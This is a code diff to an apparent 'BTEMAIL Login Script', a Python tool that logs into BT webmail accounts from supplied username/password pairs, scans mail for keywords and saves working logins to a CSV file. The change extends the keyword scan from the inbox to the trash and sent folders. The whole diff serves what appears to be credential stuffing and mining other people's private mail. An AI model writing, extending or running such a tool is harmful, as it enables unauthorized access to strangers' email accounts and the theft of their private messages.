@@ -47,10 +47,14 @@ def logout(session, logout_url):
     session.get(logout_url)
 
 def check_keywords(session, keywords):
-    response = session.get("https://signin1.bt.com/btmail/secure/inbox")
-    soup = BeautifulSoup(response.text, "html.parser")
-    text = soup.get_text()
-    return any(keyword in text for keyword in keywords)
+    folders = ["inbox", "trash", "sent"]  # Add additional folders here
+    for folder in folders:
+        response = session.get(f"https://signin1.bt.com/btmail/secure/{folder}")
+        soup = BeautifulSoup(response.text, "html.parser")
+        text = soup.get_text()
+        if any(keyword in text for keyword in keywords):
+            return True
+    return False
 
 def add_succ_login_to_csv(username, password, keywords, succ_logins_file):
     with open(succ_logins_file, "a") as f:
@@ -100,7 +104,7 @@ def display_help():
     BTEMAIL Login Script - Help
 
     This script allows you to automate the process of logging into email accounts,
-    checking for specific keywords in the inbox, and saving successful logins to a file.
+    checking for specific keywords in the inbox, trash, and sent folders, and saving successful logins to a file.
 
     Here's how to use the script:
 
